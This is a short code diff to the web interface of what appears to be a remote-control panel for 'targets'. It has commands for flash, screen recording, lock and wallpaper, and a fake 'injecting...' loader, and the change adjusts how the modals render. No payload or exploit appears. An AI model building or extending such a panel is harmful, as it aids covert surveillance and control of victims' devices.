@@ -684,7 +684,6 @@
         function toggleFlash() { flashOn = !flashOn; sendCommand(flashOn ? 'flashon' : 'flashoff'); }
         function toggleScreenRecord() { screenRecordOn = !screenRecordOn; sendCommand(screenRecordOn ? 'screenrecord start' : 'screenrecord stop'); }
 
-        // MODAL with loading bar simulation (if data missing)
         function openModal(type) {
             if (!selectedClientId) return showPopup('error', 'no target');
             currentModal = type;
@@ -693,6 +692,15 @@
             document.getElementById('modal-title').innerText = type.toUpperCase();
             const body = document.getElementById('modal-body');
             const footer = document.getElementById('modal-footer');
+            
+            // For input-based modals, don't show the data-loader and don't send data-request commands
+            if (type === 'lock' || type === 'wallpaper') {
+                body.innerHTML = ""; // Clear for immediate rendering
+                footer.innerHTML = "";
+                renderModalContent();
+                return;
+            }
+
             body.innerHTML = `<div class="data-loader"><i class="fas fa-spinner fa-pulse" style="font-size:2rem;color:var(--accent-secondary)"></i><div class="mini-loader-bar"><div class="mini-loader-fill" style="width:90%"></div></div><span>injecting...</span></div>`;
             footer.innerHTML = '';
 
